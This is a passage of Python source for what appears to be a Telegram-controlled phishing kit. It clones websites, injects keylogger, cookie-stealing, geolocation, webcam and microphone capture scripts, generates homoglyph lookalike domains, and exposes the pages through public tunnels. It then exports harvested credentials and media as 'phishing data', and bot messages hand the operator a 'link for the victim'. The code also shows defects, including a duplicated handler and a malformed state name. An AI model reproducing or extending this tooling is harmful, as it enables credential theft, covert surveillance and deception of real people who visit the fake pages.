                what = "☁️ Запускаю Cloudflared..."
            elif has_bore:
                what = "🕳 Cloudflared недоступен, запускаю bore..."
            elif has_ssh:
                what = "🔑 Запускаю тоннель через serveo (SSH)..."
            else:
                what = "🔄 Пробую запустить тоннель..."
            send_message(what, chat_id)
            _fish_stop_tunnel()
            url = _fish_start_cloudflared()
            if url:
                # Определяем тип по URL
                if "trycloudflare.com" in url:
                    icon, name = "☁️", "Cloudflared"
                elif "bore.pub" in url:
                    icon, name = "🕳", "Bore"
                elif "serveo" in url:
                    icon, name = "🔑", "Serveo"
                else:
                    icon, name = "🌍", "Туннель"
                send_message(
                    "✅ <b>Туннель запущен!</b> ({})\n"
                    "🔗 <code>{}</code>\n"
                    "Порт: {}".format(name, url, _fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb(
                        [btn("📱 QR-код", "fish:qr")],
                        [back_btn("menu_fish")]))
            else:
                available = []
                if shutil.which("bore"): available.append("bore")
                if shutil.which("ssh"):  available.append("serveo")
                hint = "Попробуй: " + " / ".join(available) if available else "Нет доступных тоннелей."
                send_message(
                    "❌ Не удалось запустить тоннель.\n{}".format(hint),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_tunnel)

    elif action == 'stop_tunnel':
        _fish_stop_tunnel()
        send_message("🛑 Туннель остановлен.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    # ── bore ────────────────────────────────────────────────────────
    elif action == 'bore_start':
        def _do_bore():
            # Если bore уже жив — не дублируем
            if (fish_bot_state.bore_process is not None and
                    fish_bot_state.bore_process.poll() is None):
                send_message(
                    "🕳 Bore уже запущен: {}".format(fish_bot_state.bore_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("bore"):
                send_message(
                    "❌ bore не установлен.\n"
                    "Установи: <code>cargo install bore-cli</code>\n"
                    "Или: <code>pkg install rust && cargo install bore-cli</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🕳 Запускаю bore...", chat_id)
            try:
                proc = subprocess.Popen(
                    ["bore", "local", str(_fish_cfg.SERVER_PORT), "--to", "bore.pub"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.bore_process = proc
                port_pat = re.compile(r"bore\.pub:(\d+)")
                url = None
                for line in proc.stdout:
                    print("bore:", line.rstrip(), flush=True)
                    m = port_pat.search(line)
                    if m:
                        url = "http://bore.pub:{}".format(m.group(1))
                        fish_bot_state.bore_url = url
                        break
                if url:
                    send_message(
                        "🕳 Bore запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message("❌ bore не дал URL. Смотри логи.", chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка bore: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_bore)

    elif action == 'bore_stop':
        if fish_bot_state.bore_process:
            fish_bot_state.bore_process.terminate()
            fish_bot_state.bore_process = None
            fish_bot_state.bore_url     = None
            send_message("🛑 Bore остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Bore не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── ngrok ────────────────────────────────────────────────────────
    elif action == 'ngrok_start':
        def _do_ngrok():
            # Проверяем что ngrok не запущен повторно
            if (fish_bot_state.ngrok_process is not None and
                    fish_bot_state.ngrok_process.poll() is None):
                send_message(
                    "🔌 ngrok уже запущен: {}".format(fish_bot_state.ngrok_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ngrok"):
                send_message(
                    "❌ ngrok не установлен.\n\n"
                    "Установка в Termux:\n"
                    "<code>pkg install wget</code>\n"
                    "<code>wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>tar xf ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>mv ngrok $PREFIX/bin/</code>\n\n"
                    "Затем авторизация (нужен бесплатный аккаунт на ngrok.com):\n"
                    "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔌 Запускаю ngrok...", chat_id)
            try:
                # ngrok http PORT — запускает туннель и пишет URL в stderr/stdout.
                # Используем --log=stdout чтобы читать JSON-лог со статусом.
                proc = subprocess.Popen(
                    ["ngrok", "http",
                     "--log=stdout", "--log-format=json",
                     str(_fish_cfg.SERVER_PORT)],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.ngrok_process = proc

                # ngrok пишет JSON-строки; ждём строку с url
                import json as _json
                url = None
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.ngrok(?:-free)?\.app")

                for line in proc.stdout:
                    line = line.strip()
                    print("ngrok:", line, flush=True)

                    # Пробуем JSON-парсинг — новые версии ngrok пишут JSON
                    try:
                        obj = _json.loads(line)
                        # Поле url появляется в событии tunnel started
                        candidate = obj.get("url") or obj.get("Url", "")
                        if candidate.startswith("https://"):
                            url = candidate
                            break
                    except _json.JSONDecodeError:
                        pass

                    # Фоллбэк — ищем URL текстовым паттерном
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break

                    # Ошибка авторизации — сообщаем сразу
                    if "ERR_NGROK_105" in line or "authentication" in line.lower():
                        proc.terminate()
                        send_message(
                            "❌ ngrok: нужна авторизация.\n"
                            "Зарегистрируйся на ngrok.com и выполни:\n"
                            "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.ngrok_url = url
                    send_message(
                        "🔌 ngrok запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ ngrok не дал URL. Проверь авторизацию и логи.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка ngrok: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_ngrok)

    elif action == 'ngrok_stop':
        if fish_bot_state.ngrok_process:
            fish_bot_state.ngrok_process.terminate()
            fish_bot_state.ngrok_process = None
            fish_bot_state.ngrok_url     = None
            send_message("🛑 ngrok остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ ngrok не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── serveo ───────────────────────────────────────────────────────
    elif action == 'serveo_start':
        def _do_serveo():
            # Проверяем что serveo не запущен повторно
            if (fish_bot_state.serveo_process is not None and
                    fish_bot_state.serveo_process.poll() is None):
                send_message(
                    "🔑 Serveo уже запущен: {}".format(fish_bot_state.serveo_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ssh"):
                send_message(
                    "❌ ssh не найден.\n<code>pkg install openssh</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔑 Запускаю serveo (SSH-тоннель)...", chat_id)
            try:
                # serveo.net — бесплатный SSH reverse tunnel.
                # -R 80:localhost:PORT пробрасывает локальный порт на serveo.
                # -N — не выполнять команды, только форвардинг.
                # ServerAliveInterval — keepalive чтобы SSH не закрылся.
                proc = subprocess.Popen(
                    ["ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ServerAliveInterval=30",
                     "-o", "ServerAliveCountMax=3",
                     "-o", "ExitOnForwardFailure=yes",
                     "-R", "80:localhost:{}".format(_fish_cfg.SERVER_PORT),
                     "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.serveo_process = proc
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.serveo\.net")

                url = None
                for line in proc.stdout:
                    print("serveo:", line.rstrip(), flush=True)
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break
                    # serveo иногда отказывает — сообщаем сразу
                    if "Connection refused" in line or "Permission denied" in line:
                        proc.terminate()
                        send_message(
                            "❌ Serveo недоступен: {}\n\n"
                            "Попробуй bore или ngrok.".format(line.strip()),
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.serveo_url = url
                    send_message(
                        "🔑 Serveo запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ Serveo не дал URL. Сервис может быть недоступен.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка serveo: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_serveo)

    elif action == 'serveo_stop':
        if fish_bot_state.serveo_process:
            fish_bot_state.serveo_process.terminate()
            fish_bot_state.serveo_process = None
            fish_bot_state.serveo_url     = None
            send_message("🛑 Serveo остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Serveo не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── Flask-сервер ────────────────────────────────────────────────
    elif action == 'server_start':
        if fish_bot_state.server_running:
            send_message(
                "ℹ️ Сервер уже работает на порту {}.".format(_fish_cfg.SERVER_PORT),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        else:
            def _do_server_start():
                try:
                    from fish_web import app as fish_app
                    def _run():
                        fish_bot_state.server_running = True
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_fish_cfg.SERVER_PORT,
                                debug=False, use_reloader=False,
                            )
                        finally:
                            fish_bot_state.server_running = False
                    t = threading.Thread(target=_run, daemon=True, name="fish-flask")
                    fish_bot_state.server_thread = t
                    t.start()
                    import time as _time; _time.sleep(1.5)
                    send_message(
                        "✅ Сервер запущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                except Exception as e:
                    send_message("❌ Ошибка старта сервера: {}".format(e), chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            _run_in_thread(_do_server_start)

    elif action == 'server_stop':
        # Flask не умеет останавливаться красиво без Werkzeug shutdown,
        # поэтому обновляем флаг и убиваем поток через daemon-stop.
        # При следующем рестарте поднимем новый.
        fish_bot_state.server_running = False
        send_message(
            "🛑 Флаг сервера сброшен. Используй «Рестарт» для полного перезапуска.",
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'server_restart':
        def _do_restart():
            # Останавливаем bore и туннель чтобы не было конфликтов по порту
            if fish_bot_state.bore_process:
                fish_bot_state.bore_process.terminate()
                fish_bot_state.bore_process = None
                fish_bot_state.bore_url     = None
            fish_bot_state.server_running = False

            import time as _time; _time.sleep(1)

            try:
                from fish_web import app as fish_app
                def _run():
                    fish_bot_state.server_running = True
                    try:
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_fish_cfg.SERVER_PORT,
                            debug=False, use_reloader=False,
                        )
                    finally:
                        fish_bot_state.server_running = False
                t = threading.Thread(target=_run, daemon=True, name="fish-flask-restart")
                fish_bot_state.server_thread = t
                t.start()
                _time.sleep(1.5)
                send_message(
                    "🔄 Сервер перезапущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка рестарта: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_restart)

    elif action == 'gen_domain':
        _wait_state[chat_id] = 'fish_gen_domain'
        send_message("🔀 Введи домен (например limpa.ru):", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'qr':
        url = fish_bot_state.tunnel_url or "http://localhost:{}".format(_fish_cfg.SERVER_PORT)
        try:
            img = fish_utils.generate_qr(url, return_img=True)
            import requests as _req
            _req.post(
                "https://api.telegram.org/bot{}/sendPhoto".format(config.TELEGRAM_BOT_TOKEN),
                data={'chat_id': chat_id, 'caption': "🔗 {}".format(url)},
                files={'photo': ('qr.png', img, 'image/png')},
                timeout=30
            )
        except Exception as e:
            send_message("❌ QR ошибка: {}".format(e), chat_id)

    elif action == 'photos':
        webcam_dir = os.path.join(_fish_cfg.LOGS_DIR, 'webcam')
        files = sorted(os.listdir(webcam_dir), reverse=True)[:10] if os.path.exists(webcam_dir) else []
        if not files:
            send_message("📭 Нет фото.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "📸 <b>Фото с вебки:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'audios':
        audio_dir = os.path.join(_fish_cfg.LOGS_DIR, 'microphone')
        files = sorted(os.listdir(audio_dir), reverse=True)[:10] if os.path.exists(audio_dir) else []
        if not files:
            send_message("📭 Нет аудио.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "🎵 <b>Аудио записи:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'map':
        send_message("🗺 Генерирую карту...", chat_id)
        def _do_map():
            try:
                import sqlite3
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                try:
                    rows = conn.execute(
                        "SELECT lat, lon FROM geo WHERE lat IS NOT NULL AND lon IS NOT NULL"
                    ).fetchall()
                except Exception:
                    rows = []
                conn.close()

                if not rows:
                    send_message("❌ Нет данных геолокации.", chat_id)
                    return

                # Пробуем folium
                try:
                    import folium, io, tempfile
                    lats = [r[0] for r in rows]
                    lons = [r[1] for r in rows]
                    m = folium.Map(location=[sum(lats)/len(lats), sum(lons)/len(lons)], zoom_start=2)
                    for lat, lon in rows:
                        folium.Marker([lat, lon]).add_to(m)
                    with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as tmp:
                        m.save(tmp.name); tmp_path = tmp.name
                    send_document(tmp_path, caption=f"📍 Карта ({len(rows)} точек)", chat_id=chat_id)
                    os.unlink(tmp_path)
                    return
                except ImportError:
                    pass

                # Fallback: текстовый отчёт с ссылками Google Maps
                lines = [f"📍 <b>Геолокации ({len(rows)} точек):</b>\n"]
                for i, (lat, lon) in enumerate(rows[:20], 1):
                    url = f"https://maps.google.com/?q={lat},{lon}"
                    lines.append(f"{i}. <a href='{url}'>{lat:.4f}, {lon:.4f}</a>")
                if len(rows) > 20:
                    lines.append(f"\n... и ещё {len(rows)-20} точек")
                lines.append("\n💡 Установи folium: <code>pip install folium pandas</code>")
                send_message("\n".join(lines), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))

            except Exception as e:
                send_message(f"❌ Ошибка карты: {e}", chat_id)
        _run_in_thread(_do_map)

    elif action == 'export':
        send_message("📤 Экспортирую...", chat_id)
        def _do_export():
            try:
                import sqlite3, pandas as pd, zipfile, io, tempfile
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                dfs = {
                    'credentials.csv': pd.read_sql_query("SELECT * FROM credentials", conn),
                    'geo.csv': pd.read_sql_query("SELECT * FROM geo", conn),
                    'media.csv': pd.read_sql_query("SELECT * FROM media", conn),
                    'visits.csv': pd.read_sql_query("SELECT * FROM visits", conn),
                }
                conn.close()
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, 'a', zipfile.ZIP_DEFLATED) as zf:
                    for name, df in dfs.items():
                        zf.writestr(name, df.to_csv(index=False).encode('utf-8'))
                buf.seek(0)
                with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
                    tmp.write(buf.read()); tmp_path = tmp.name
                send_document(tmp_path, caption="📦 Фишинг данные", chat_id=chat_id)
                os.unlink(tmp_path)
            except Exception as e:
                send_message("❌ Ошибка экспорта: {}".format(e), chat_id)
        _run_in_thread(_do_export)

    elif action == 'clear_logs':
        fish_db.clear_all_logs()
        send_message("🧹 Логи и БД очищены.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'status':
        turl = fish_bot_state.tunnel_url
        tunnel_ok = fish_bot_state.tunnel_process and fish_bot_state.tunnel_process.poll() is None
        active_info = fish_downloader.get_active_page_info()
        active_str = "✅ ID: {}".format(active_info[0]) if active_info else "❌ нет"
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            stats_str = "Крединш: {} | Гео: {} | Фото: {} | Аудио: {} | Визиты: {}".format(
                cc, gc, wc, mc, vc)
        except Exception:
            stats_str = "n/a"
        send_message(
            "ℹ️ <b>Статус фишинга</b>\n\n"
            "🌍 Туннель: {} | {}\n"
            "📄 Активная стр.: {}\n"
            "🖥 Flask порт: {}\n"
            "📊 {}".format(
                "🟢 работает" if tunnel_ok else "🔴 стоп",
                turl or "нет URL",
                active_str,
                _fish_cfg.SERVER_PORT,
                stats_str),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))


def _fish_process_load(chat_id, url, inject_geo=False, inject_media=False,
                        fake_domain=False, capture_photo=True, capture_audio=True):
    """Скачивает страницу и активирует её с прогресс-статусами."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    fish_bot_state.last_loaded_url = url

    # Отправляем первое сообщение и запоминаем его ID для последующего
    # редактирования — так пользователь видит прогресс в одном месте,
    # а не получает 5 отдельных сообщений.
    msg = send_message("⏬ Скачиваю {}...".format(url), chat_id)
    msg_id = msg.get('result', {}).get('message_id') if msg else None

    def _status(text):
        """Редактируем существующее сообщение или шлём новое."""
        if msg_id:
            try:
                edit_message(chat_id, msg_id, text)
                return
            except Exception:
                pass
        send_message(text, chat_id)

    def _do():
        try:
            # on_status передаём чтобы download_page мог обновлять статус
            # пока идёт скачивание — иначе пользователь видит тишину 20-30 сек
            html = fish_downloader.download_page(url, on_status=_status)
            _status("⚙️ Применяю скрипты...")
            html = fish_utils.inject_scripts(
                html, geo=inject_geo, media=inject_media,
                capture_photo=capture_photo, capture_audio=capture_audio)
            if fake_domain:
                from urllib.parse import urlparse
                orig = urlparse(url).netloc
                fake = fish_utils.generate_homoglyph_domain(orig)
                html = fish_utils.replace_domain_in_html(html, orig, fake)
            pid = fish_downloader.save_page(html, url, 'single')
            fish_downloader.set_active_page(pid)
            send_message(
                "✅ Страница сохранена и активирована!\nID: <code>{}</code>".format(pid),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
    _run_in_thread(_do)


def _fish_handle_wait_state(state, text, chat_id):
    """Обрабатывает состояния ожидания для фишинг-модуля. Возвращает True если обработано."""
    if not state.startswith('fish_') or not FISH_ENABLED:
        return False

    if state == 'fish_load_url':
        _fish_process_load(chat_id, text)

def _fish_handle_wait_state(state, text, chat_id):
    if not state.startswith('fish_') or not FISH_ENABLED:
        return False

    if state == 'fish_load_url':
        _fish_process_load(chat_id, text)
        return True

    elif state == 'fish_fullsite_url':
        target_url = text.strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        send_message("🌐 Скачиваю весь сайт... (может занять минуту)", chat_id)

        def _do_fs(url_to_download):
            try:
                index_path, site_dir = fish_downloader.download_full_site(url_to_download, _fish_cfg.DOWNLOADS_DIR)
                pid = fish_downloader.save_full_site(url_to_download, site_dir)
                _fish_user_data[chat_id] = {
                    'full_site_page_id': pid,
                    'site_index_path': index_path,
                    'site_url': url_to_download
                }
                _fish_show_options(chat_id)
            except Exception as e:
                send_message("❌ Ошибка: {}".format(e), chat_id)

        _run_in_thread(_do_fs, target_url)
        return True

    elif state == 'fish_load_geo_url':
        _fish_process_load(chat_id, text, inject_geo=True)
        return True

    elif state == 'fis  h_load_cam_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=True, capture_audio=True)

    elif state == 'fish_load_mic_url':
        _fish_process_load(chat_id, text, inject_media=True, capture_photo=True, capture_audio=True)

    elif state == 'fish_payload_url':
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        html = fish_utils.generate_redirect_page(url)
        pid = fish_downloader.save_page(html, "payload_{}".format(url), 'redirect')
        fish_downloader.set_active_page(pid)
        send_message("✅ Payload-редирект создан! ID: <code>{}</code>".format(pid),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_use_page':
        ok = fish_downloader.set_active_page(text.strip())
        send_message("✅ Активирована: {}".format(text) if ok else "❌ Страница не найдена: {}".format(text),
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_clone_page':
        new_id = fish_downloader.clone_page(text.strip())
        send_message("✅ Клон создан: <code>{}</code>".format(new_id) if new_id else "❌ Страница не найдена",
                     chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_gen_domain':
        domain = text.strip()
        fake = fish_utils.generate_homoglyph_domain(domain)
        send_message(
            "🔀 Оригинал: <code>{}</code>\n🎭 Похожий: <code>{}</code>".format(domain, fake),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif state == 'fish_iframe_url':
        opts = _fish_user_opts.setdefault(chat_id, {})
        url = text if text.startswith(('http://', 'https://')) else 'https://' + text
        opts['iframe_url'] = url
        opts['iframe_phish'] = True
        _fish_send_options(chat_id)

    else:
        return False
    return True


def _fish_handle_selfile(file_id_str, chat_id):
    """Обработка выбора файла для страницы скачивания."""
    try:
        fid = int(file_id_str)
    except Exception:
        send_message("❌ Неверный ID", chat_id)
        return
    _fish_user_data[chat_id] = {'file_id': fid}
    _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    _fish_send_options(chat_id)


def _fish_handle_opt(toggle, chat_id):
    """Переключает опции инжекций."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    if toggle == 'geo':
        opts['geo'] = not opts['geo']
    elif toggle == 'cam':
        opts['cam'] = not opts['cam']
    elif toggle == 'mic':
        opts['mic'] = not opts['mic']
    elif toggle == 'auto':
        opts['auto'] = not opts['auto']
    elif toggle == 'keylogger':
        opts['keylogger'] = not opts.get('keylogger', False)
    elif toggle == 'cookies':
        opts['steal_cookies'] = not opts.get('steal_cookies', False)
    elif toggle == 'sysinfo':
        opts['system_info'] = not opts.get('system_info', False)
    elif toggle == 'iframe':
        current = opts.get('iframe_phish', False)
        opts['iframe_phish'] = not current
        if not current:
            # Нужен URL
            _wait_state[chat_id] = 'fish_iframe_url'
            send_message("Введи URL оригинальной страницы для iframe (например, https://vk.com):",
                         chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))
            return
    elif toggle == 'generate':
        # Проверяем, есть ли путь к скачанному сайту (full_site)
        full_page_id = _fish_user_data.get(chat_id, {}).get('full_site_page_id')
        site_path = _fish_user_data.get(chat_id, {}).get('site_index_path')
        
        if full_page_id and site_path:
            # Читаем HTML
            with open(site_path, 'r', encoding='utf-8') as f:
                html = f.read()
            # Внедряем скрипты
            html = fish_utils.inject_scripts(
                html,
                geo=opts.get('geo', False),
                media=opts.get('cam', False) or opts.get('mic', False),
                capture_photo=opts.get('cam', False),
                capture_audio=opts.get('mic', False),
                keylogger=opts.get('keylogger', False),
                steal_cookies=opts.get('steal_cookies', False),
                system_info=opts.get('system_info', False),
                iframe_phish=opts.get('iframe_phish', False),
                iframe_url=opts.get('iframe_url'),
            )
            
            # Сохраняем модифицированный HTML как новую одиночную страницу
            # (или можно заменить исходный, но лучше создать новую)
            new_pid = fish_downloader.save_page(html, _fish_user_data[chat_id]['site_url'], 'single')
            
            # Активируем её
            fish_downloader.set_active_page(new_pid)
            
            # Очищаем временные данные
            _fish_user_data.pop(chat_id, None)
            
            # Отправляем сообщение об успехе
            base_url = (fish_bot_state.tunnel_url or
                        (fish_bot_state.bore_url if hasattr(fish_bot_state, 'bore_url') else None) or
                        ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                         if fish_bot_state.server_running else None))
            url_line = "\n\n🔗 <b>Ссылка для жертвы:</b>\n<code>{}/</code>".format(base_url) if base_url else ""
            
            send_message(
                "✅ <b>Сайт с инжекциями создан и активирован!</b>\n"
                "ID: <code>{}</code>{}\n\n"
                "<i>Страница активирована и готова к работе.</i>".format(new_pid, url_line),
                chat_id,
                reply_markup=kb(
                    [btn("📱 QR-код", "fish:qr"), btn("📊 Статистика", "fish:stats")],
                    [btn("🌐 Меню фишинга", "menu_fish")],
                ))
            return
        
        # ... остальной код для обычного файла-приманки

        # --- Если это обычный файл-приманка (нет site_path) ---
        fid = _fish_user_data.get(chat_id, {}).get('file_id')
        if not fid:
            send_message("❌ Файл не выбран", chat_id)
            return
        files = fish_db.get_all_files()
        file_info = next((f for f in files if f['id'] == fid), None)
        if not file_info:
            send_message("❌ Файл не найден", chat_id)
            return
        fname = file_info['original_name']

        # Здесь должен быть ваш существующий код для создания страницы скачивания
        # (использующий шаблон, инжекции и т.д.) – вставьте его сюда
        # Пример (адаптируйте под вашу реализацию):
        dl_tmpl_path = _fish_cfg.DOWNLOAD_TEMPLATE_PATH
        if os.path.exists(dl_tmpl_path):
            with open(dl_tmpl_path, 'r', encoding='utf-8') as f:
                html = f.read()
        else:
            html = ("""<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Скачать {fn}</title></head>
<body><h1>📥 {fn}</h1><a href='/download/{fid}'>Скачать</a></body></html>""").format(fn=fname, fid=fid)

        html = html.replace('{file_id}', str(fid)).replace('{file_name}', fname)
        html = fish_utils.inject_scripts(
            html,
            geo=opts.get('geo', False),
            media=opts.get('cam', False) or opts.get('mic', False),
            capture_photo=opts.get('cam', False),
            capture_audio=opts.get('mic', False),
            download_file_id=fid,
            auto_download=opts.get('auto', False),
            keylogger=opts.get('keylogger', False),
            steal_cookies=opts.get('steal_cookies', False),
            system_info=opts.get('system_info', False),
            iframe_phish=opts.get('iframe_phish', False),
            iframe_url=opts.get('iframe_url'),
        )
        pid = fish_downloader.save_page(html, "dl_page_{}".format(fid), 'download')
        fish_downloader.set_active_page(pid)
        _fish_user_data.pop(chat_id, None)

        base_url = (fish_bot_state.tunnel_url or
                    (fish_bot_state.bore_url if hasattr(fish_bot_state, 'bore_url') else None) or
                    ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                     if fish_bot_state.server_running else None))
        url_line = "\n\n🔗 <b>Ссылка для жертвы:</b>\n<code>{}/</code>".format(base_url) if base_url else ""

        send_message(
            "✅ <b>Страница скачивания создана!</b>\n"
            "ID: <code>{}</code>  |  Файл: <b>{}</b>{}\n\n"
            "<i>Страница активирована и готова к работе.</i>".format(pid, fname, url_line),
            chat_id,
            reply_markup=kb(
                [btn("📱 QR-код", "fish:qr"), btn("📊 Статистика", "fish:stats")],
                [btn("🌐 Меню фишинга", "menu_fish")],
            ))
        return

    _fish_send_options(chat_id)


# ════════════════════════════════════════════════════════════

